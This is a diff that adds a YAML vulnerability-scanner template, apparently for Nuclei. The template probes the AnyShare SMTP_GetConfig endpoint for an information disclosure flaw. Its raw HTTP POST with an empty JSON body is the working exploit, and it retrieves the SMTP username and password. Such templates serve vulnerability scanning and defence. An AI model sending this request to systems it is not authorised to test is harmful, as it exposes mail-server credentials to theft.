@@ -1,0 +1,31 @@
+id: anyshare-SMTP_GetConfig-disclosure
+info:
+  name: 爱数 AnyShare SMTP_GetConfig - 信息泄露漏洞
+  author: leadlife
+  severity: high
+  description: 爱数AnyShare的SMTP_GetConfig接口存在信息泄露漏洞。攻击者可以通过该接口获取到敏感的配置信息，例如SMTP服务器的用户名和密码等。
+  reference: 
+    - https://mp.weixin.qq.com/s/AimjTR0a5zfuJNRi1pe_Pw
+  classification:
+    cve-id: 
+  metadata:
+    verified: true
+    fofa-query: demo
+    hunter-query: demo
+  tags: 2025,anyshare,disclosure
+
+http:
+  - raw:
+      - |
+        POST /api/ShareMgnt/SMTP_GetConfig HTTP/1.1
+        Host: {{Hostname}}
+        Content-Type: application/json
+
+        {}
+        
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains_all(body,'email','password','port','server')
+        condition: and
